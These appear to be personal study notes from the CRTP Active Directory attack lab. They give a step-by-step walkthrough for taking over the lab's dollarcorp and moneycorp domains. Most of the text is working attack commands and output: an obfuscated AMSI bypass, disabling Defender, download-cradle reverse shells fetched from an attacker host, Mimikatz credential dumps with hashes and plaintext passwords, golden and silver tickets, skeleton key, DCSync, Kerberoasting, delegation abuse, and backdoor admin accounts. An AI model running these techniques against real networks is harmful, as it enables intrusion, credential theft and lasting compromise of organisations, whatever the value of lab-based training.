CRTP Notes  
Lab  
In Scope:

-   172.16.1.0/24 – 172.16.17.0/

# RDP into student VM

```
xfreerdp /u:student27 /p:<password> /v:172.16.100.27 /dynamic-resolution
```

# AMSI Bypass
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

# Import PowerView
```powershell
Import-Module PowerView.ps1
```

# Learning Objective 1 

#### Enumerate the following for the dollarcorp domain:

- Users
- Computers
- Domain Administrators
- Enterprise Administrators
- Shares

# Learning Objective 2

#### Enumerate following for the dollarcorp domain:
- List all the OUs
- List all the computers in the StudentMachines OU.
	- `Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}`
- List the GPOs
- Enumerate GPO applied on the StudentMachines OU.`
	- `Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} | %{Get-NetGPO -ComputerName $_}`

# Import AD Module
```powershell
PS C:\AD\Tools\ADModule-master\ActiveDirectory> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\AD\Tools\ADModule-master\ActiveDirectory> Import-Module .\ActiveDirectory.psd1
```

# Learning Objective 3

#### Enumerate following for the dollarcorp domain:
– ACL for the Users group
	- `Get-ObjectAcl -SamAccountName "Users" –ResolveGUIDs`
– ACL for the Domain Admins group
	- `Get-ObjectAcl -SamAccountName "Domain Admins" –ResolveGUIDs`
– All modify rights/permissions for the studentx
	- `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student"}`

# Learning Objective 4

- Enumerate all domains in the moneycorp.local forest
- Map the trusts of the dollarcorp.moneycorp.local domain
- Map External trusts in moneycorp.local forest
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
	- `Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust`

# Learning Objective 5

• Exploit a service on dcorp-studentx and elevate privileges to local administrator.
```powershell
PS C:\AD\Tools> Import-Module PowerUp.ps1
PS C:\AD\Tools> Invoke-ServiceAbuse -Name 'AbyssWebServer'

ServiceAbused  Command
-------------  -------
AbyssWebServer net user john Password123! /add && net localgroup Administrators john /add
```

• Identify a machine in the domain where studentx has local administrative access
	- After Escalating Privileges -> `Find-LocalAdminAccess` -> `dcorp-adminsrv.dollarcorp.moneycorp.local`

• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
	- Payload for Jenkins that worked -> `powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://172.16.99.27/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.99.27 -Port 1234"` (SET UP A LISTENER WITH NETCAT)
	- 

### Disable Defenses
```powershell
# Add exclusion to folder
Remove-MpPreference -ExclusionPath "C:\Temp"

# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Learning Objective 6

• Setup BloodHound and identify a machine where studentx has local administrative access. 
	- Download SharpHound.ps1 Ingestor
		- `iex (New-Object Net.WebClient).DownloadString('http://172.16.99.27/SharpHound.ps1')`
	- Enumerate Domain: `Invoke-BloodHound -CollectionMethod All`

# Learning Objective 7

• Domain user on one of the machines has access to a server where a domain admin is logged in. Identify:
– The domain user
	- `Invoke-UserHunter` -> `svcadmin`
– The server where the domain admin is logged in.
	- `Invoke-UserHunter` -> `dcorp-mgmt.dollarcorp.moneycorp.local`

• Escalate privileges to Domain Admin
– Using the method above.
	- From Jenkins: `Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local` -> `
```
dcorp\ciadmin 
dcorp-mgmt
```
– Using derivative local admin
```powershell
evil-winrm -i 172.16.4.44 -u ciadmin -p *ContinuousIntrusion123

C:\Users\ciadmin\Documents> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

PS C:\Users\ciadmin\Documents> Set-MpPreference -DisableRealtimeMonitoring $true

wget http://172.16.99.27/shell443.exe -o shell443.exe

.\shell443.exe

meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : DCORP-MGMT
SysKey : df4126b764b7b0f0821ff7d3835a9646

Local name : DCORP-MGMT ( S-1-5-21-2765387493-2672277587-2490794481 )
Domain name : dcorp ( S-1-5-21-1874506631-3219952063-538504511 )
Domain FQDN : dollarcorp.moneycorp.local

Policy subsystem is : 1.14
LSA Key(s) : 1, default {f50da686-c482-2239-b478-953927792efc}
  [00] {f50da686-c482-2239-b478-953927792efc} 25d4763a1137fe6c593ad2e437ba5f8690b30032be1ed129b8a178b614f1fb56

Secret  : $MACHINE.ACC
cur/hex : df 1c e9 70 98 2f e1 9f 34 9d f2 d9 a4 75 e2 f0 88 4a 0c 4a 48 fc 82 64 0b cc d6 3d 8d c5 b0 1c 56 57 44 23 e1 d7 b3 0e 66 6d 7f 8c 23 00 39 46 3d ee 67 ee 6f 28 b5 70 47 76 65 1b 66 a3 6f 71 85 73 7a 94 33 4e 38 a1 6f 2a 16 2c 23 7d 2f ba a2 86 fe 63 62 3e 2d 8e 9a af d6 1d 7e 05 a5 1c eb 04 d2 40 bf 6d c1 cb b7 fd db f6 23 ed bf 9b d3 30 80 03 d6 a9 87 14 88 47 09 8e 26 c3 b4 e7 f6 f6 5f 4b 62 e1 9c 3e 51 4b 7d 4c c0 a1 02 48 72 df b0 3c 32 55 09 ae e2 b7 aa e9 ca e9 f3 d7 fd 65 b4 92 f3 c1 ff ec 81 95 15 b3 db ce 7d 05 41 81 59 2c f6 fd 46 d4 43 cb 89 61 88 2e 5a 1a 99 5f 03 d9 ad 74 f6 c8 35 3e 33 7c 22 20 8a 70 b5 e6 35 1e 4b 60 6f f9 c8 a0 7e b6 9a 84 2a 42 91 df bd fb 54 f6 d8 a9 ba 29 5a 90 70 de ba 53 
    NTLM:639c1adde3e0d1ba0d733c7d0d8f23ec
    SHA1:944b2007bbb8137e85ecb019f409790040c435f9
old/text: Ee*2$jAW8eKW(;R-wsZ3680`Qf>?_E+Y\ djW:(fM>HgH_1bt:6FeTs#nz<^0Ov]E,iw2O+,8Z\b^an6\)Iz&l>LlDK$K4Y$Ke5cvz2y?j,0[XYNcQY:LpdP
    NTLM:8885a6cf17560a134e1bb038c3602e83
    SHA1:6a22c90b705a44942288b71a7a4585f26258e478

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 cd 72 7f fd c2 ba 53 1b 5b ec e1 af a0 84 3e 14 12 be 65 3f 09 82 1c 0a 14 ba 4d d3 87 ce 5d c6 82 a1 e3 12 ae 59 9f 6c 
    full: cd727ffdc2ba531b5bece1afa0843e1412be653f09821c0a14ba4dd387ce5dc682a1e312ae599f6c
    m/u : cd727ffdc2ba531b5bece1afa0843e1412be653f / 09821c0a14ba4dd387ce5dc682a1e312ae599f6c
old/hex : 01 00 00 00 f4 07 fb f1 b1 57 cf 7f 48 d8 15 ab 61 c2 14 a8 46 ea 62 fb c0 5e 29 15 ed b0 60 18 db d3 43 06 52 89 97 9c 35 dd ba 49 
    full: f407fbf1b157cf7f48d815ab61c214a846ea62fbc05e2915edb06018dbd343065289979c35ddba49
    m/u : f407fbf1b157cf7f48d815ab61c214a846ea62fb / c05e2915edb06018dbd343065289979c35ddba49

Secret  : NL$KM
cur/hex : 51 b8 60 3f a3 14 a4 9f e9 b3 6f ef 67 36 8b fd 5c bb 7a 21 63 1f 9e 1b c0 85 4d b4 15 0f 59 02 65 ea d2 2e 71 4a 2b 40 cd 92 b2 dc ca 3d b8 61 fe 95 4a ce ab 7d a1 48 f1 a6 06 6e c0 b9 1e 33 
old/hex : 51 b8 60 3f a3 14 a4 9f e9 b3 6f ef 67 36 8b fd 5c bb 7a 21 63 1f 9e 1b c0 85 4d b4 15 0f 59 02 65 ea d2 2e 71 4a 2b 40 cd 92 b2 dc ca 3d b8 61 fe 95 4a ce ab 7d a1 48 f1 a6 06 6e c0 b9 1e 33 

Secret  : _SC_MSSQLSERVER / service 'MSSQLSERVER' with username : dcorp\svcadmin
cur/text: *ThisisBlasphemyThisisMadness!!

Secret  : _SC_SQLTELEMETRY / service 'SQLTELEMETRY' with username : NT Service\SQLTELEMETRY
```

### The Intended Way
```
# From the Jenkins server
PS C:\Users\john\Documents> Enable-PSRemoting
PS C:\Users\john\Documents> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
PS C:\Users\john\Documents> Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
PS C:\Users\john\Documents> iex (iwr http://172.16.99.27/Invoke-Mimikatz.ps1 -UseBasicParsing)
PS C:\Users\john\Documents> Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
mimikatz(powershell) # sekurlsa::logonpasswords
Authentication Id : 0 ; 968190 (00000000:000ec5fe)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/5/2023 3:14:25 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1121
	msv :	
	 [00000003] Primary
	 * Username : mgmtadmin
	 * Domain   : dcorp
	 * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
	 * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
	 * DPAPI    : b826a190021809d711368730cfc6e41d
	tspkg :	
	wdigest :	
	 * Username : mgmtadmin
	 * Domain   : dcorp
	 * Password : (null)
	kerberos :	
	 * Username : mgmtadmin
	 * Domain   : DOLLARCORP.MONEYCORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/5/2023 1:32:53 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : DCORP-MGMT$
	 * Domain   : dcorp
	 * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
	 * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
	tspkg :	
	wdigest :	
	 * Username : DCORP-MGMT$
	 * Domain   : dcorp
	 * Password : (null)
	kerberos :	
	 * Username : dcorp-mgmt$
	 * Domain   : DOLLARCORP.MONEYCORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 63361 (00000000:0000f781)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/5/2023 1:32:53 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1122
	msv :	
	 [00000003] Primary
	 * Username : svcadmin
	 * Domain   : dcorp
	 * NTLM     : b38ff50264b74508085d82c69794a4d8
	 * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
	 * DPAPI    : fd3c6842994af6bd69814effeedc55d3
	tspkg :	
	wdigest :	
	 * Username : svcadmin
	 * Domain   : dcorp
	 * Password : (null)
	kerberos :	
	 * Username : svcadmin
	 * Domain   : DOLLARCORP.MONEYCORP.LOCAL
	 * Password : *ThisisBlasphemyThisisMadness!!
	ssp :	
	credman :	

Authentication Id : 0 ; 62114 (00000000:0000f2a2)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 1/5/2023 1:32:53 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
	msv :	
	 [00000003] Primary
	 * Username : DCORP-MGMT$
	 * Domain   : dcorp
	 * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
	 * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
	tspkg :	
	wdigest :	
	 * Username : DCORP-MGMT$
	 * Domain   : dcorp
	 * Password : (null)
	kerberos :	
	 * Username : DCORP-MGMT$
	 * Domain   : dollarcorp.moneycorp.local
	 * Password : df 1c e9 70 98 2f e1 9f 34 9d f2 d9 a4 75 e2 f0 88 4a 0c 4a 48 fc 82 64 0b cc d6 3d 8d c5 b0 1c 56 57 44 23 e1 d7 b3 0e 66 6d 7f 8c 23 00 39 46 3d ee 67 ee 6f 28 b5 70 47 76 65 1b 66 a3 6f 71 85 73 7a 94 33 4e 38 a1 6f 2a 16 2c 23 7d 2f ba a2 86 fe 63 62 3e 2d 8e 9a af d6 1d 7e 05 a5 1c eb 04 d2 40 bf 6d c1 cb b7 fd db f6 23 ed bf 9b d3 30 80 03 d6 a9 87 14 88 47 09 8e 26 c3 b4 e7 f6 f6 5f 4b 62 e1 9c 3e 51 4b 7d 4c c0 a1 02 48 72 df b0 3c 32 55 09 ae e2 b7 aa e9 ca e9 f3 d7 fd 65 b4 92 f3 c1 ff ec 81 95 15 b3 db ce 7d 05 41 81 59 2c f6 fd 46 d4 43 cb 89 61 88 2e 5a 1a 99 5f 03 d9 ad 74 f6 c8 35 3e 33 7c 22 20 8a 70 b5 e6 35 1e 4b 60 6f f9 c8 a0 7e b6 9a 84 2a 42 91 df bd fb 54 f6 d8 a9 ba 29 5a 90 70 de ba 53 
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/5/2023 1:32:53 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 21439 (00000000:000053bf)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/5/2023 1:32:52 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : DCORP-MGMT$
	 * Domain   : dcorp
	 * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
	 * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/5/2023 1:32:52 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : DCORP-MGMT$
	 * Domain   : dcorp
	 * Password : (null)
	kerberos :	
	 * Username : dcorp-mgmt$
	 * Domain   : DOLLARCORP.MONEYCORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

mimikatz(powershell) # exit
Bye!
```

# Learning Objective 8

• Dump hashes on the domain controller of dollarcorp.moneycorp.local.
	- `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc`

• Using the NTLM hash of krbtgt account, create a Golden ticket.
	- `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`

• Use the Golden ticket to (once again) get domain admin privileges from a machine.
	- `<STUDENT VM> cp C:\AD\Tools\Invoke-Mimikatz.ps1 '\\dcorp-dc.dollarcorp.moneycorp.local\C$\Users\Administrator\Desktop\Invoke-Mimikatz.ps1'
	- `<ATTACKER MACHINE> evil-winrm -i 172.16.100.27 -u student27 -p XD9nVnegHk3HYU4k`
	- `<ATTACKER MACHINE> *Evil-WinRM* PS C:\AD\Tools> upload /mnt/crtp/Tools/SysinternalsSuite/PsExec.exe`
	- `<ATTACKER MACHINE> *Evil-WinRM* PS C:\AD\Tools> upload /mnt/crtp/Tools/SysinternalsSuite/Eula.txt`
	- `<STUDENT VM> C:\\AD\\Tools\\PsExec.exe \\dcorp-dc cmd.exe`
	- `<DC MACHINE> net user superstar Password123! /add`
	- `<DC MACHINE> net localgroup "Administrators" superstar /add`
	- `<DC MACHINE> net localgroup "Remote Desktop Users" superstar /add`

# Learning Objective 9 

Try to get command execution on the domain controller by creating silver ticket for:

- HOST service
	- `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'`
	- `schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.99.27/Invoke-PowerShellTcpOneLine.ps1''')'"`
	- `schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"`
- WMI
	- `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:WMI /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'`

# Learning Objective 10

Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.
	- `<DCORP-DC VM> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
	- `<ANY COMPUTER IN THE DOMAIN> Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator` 
		-> With password: `mimikatz`

# Learning Objective 11

Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
	- `<DCORP-DC VM> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`
	- `<DCORP-DC VM> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
	- `<DCORP-DC> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
	- `<STUDENT VM> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'`
	- `<NEW POWERSHELL PROMP FROM PTT> ls \\dcorp-dc\C$`

# Learning Objective 12

• Check if studentx has Replication (DCSync) rights.
	- `<STUDENT VM> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student27") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}`

• If yes, execute the DCSync attack to pull hashes of the krbtgt user.
• If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
	- `<STUDENT VM> Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student27 -Rights DCSync -Verbose`
	- `<STUDENT VM> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

# Learning Objective 13

• Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access. 
	- `<STUDENT VM> Set-RemoteWMI -UserName student27 -Verbose`
	- `<DCORP-DC VM> Set-RemoteWMI -UserName student27 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
	- `<STUDENT VM> Set-RemotePSRemoting -UserName student27 -Verbose`
	- `<DCORP-DC VM> Set-RemotePSRemoting -UserName student27 -ComputerName dcorp-dc -Verbose

• Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.


# Learning Objective 14

Using the Kerberoast attack, crack password of a SQL server service account.
- Enumeration
	- Get User SPN for SQL account: `Get-NetUser –SPN`
	- Request a TGS:
```powershell
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
- Export ticket: `Invoke-Mimikatz -Command '"kerberos::list /export"'`
-  Crack ticket: `python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student27@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.localDOLLARCORP.MONEYCORP.LOCAL.kirbi`
- Cracked service account password: `*ThisisBlasphemyThisisMadness!!`

# Learning Objective 15

• Enumerate users that have Kerberos Preauth disabled.
	- `Get-DomainUser -PreauthNotRequired -Verbose | select cn`
• Obtain the encrypted part of AS-REP for such an account. 
	- `Get-ASREPHash -UserName VPN27user`
• Determine if studentx has permissions to set UserAccountControl flags for any user. 
	- `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} | select ObjectDN`
• If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
	- `Set-DomainObject -Identity Control27User -XOR @{useraccountcontrol=4194304} –Verbose`
	- `Get-ASREPHash -UserName Control27User -Verbose`

# Learning Objective 16

- Determine if studentx has permissions to set UserAccountControl flags for any user. 
	- `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} | select ObjectDN`
- If yes, force set a SPN on the user and obtain a TGS for the user.
	- `Set-DomainObject -Identity Support27User -XOR @{useraccountcontrol=4194304} –Verbose`
	- `Get-ASREPHash -UserName Support27User -Verbose`


# Learning Objective 17

• Find a server in dcorp domain where Unconstrained Delegation is enabled. 
	- `Get-NetComputer -UnConstrained`
• Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.
	- `<UNCONSTRAINED DELEGATION ENABLED COMPUTER> .\Rubeus.exe monitor /interval:5 /nowrap`
	- `<STUDENT VM> .\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
	- `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

# Learning Objective 18

• Enumerate users in the domain for whom Constrained Delegation is enabled. `Get-DomainUser –TrustedToAuth`
– For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. 
	- `kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f`
	- `tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
– Pass the ticket and access the service as DA. 
	- `Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
	- `ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`

• Enumerate computer accounts in the domain for which Constrained Delegation is enabled. `Get-DomainComputer –TrustedToAuth`
– For such a computer, request a TGT from the DC.
	- `tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67`
	- `tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorpdc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL`
	- `Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorpdc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
– Use the TGS for executing the DCSync attack.
	- `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

# Learning Objective 19

Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
	- `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc`

# Learning Objective 20

Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
	- `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' `
	- `Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'`
	- `Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"' `
	- `Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'`
	- `net user superstar Password123! /add`
	- `net localgroup "Remote Desktop Users" superstar /add`
	- `net localgroup "Administrators" superstar /add`
	- `net group "Domain Admins" superstar /add`
	- `net group "Enterprise Admins" superstar /add`


# Learning Objective 21

- With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
	- Download mimikatz with cradle: `iex (New-Object Net.WebClient).DownloadString('http://172.16.99.27/Invoke-Mimikatz.ps1')`
	- Spawn powershell with pass the hash using svcadmin: `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8"'`
	- Get inter-forest trust key: `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local` (grab `* rc4_hmac_nt` hash)
	- Generate ticket with rc4 hash: `Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:3beb57d6bef432b8f731acd9322b0225 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'`
	- Request TGS: `.\asktgs.exe .\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local`
	- Load ticket to memory: `.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
	- Interact with File System: `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`


# Learning Objective 22

Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
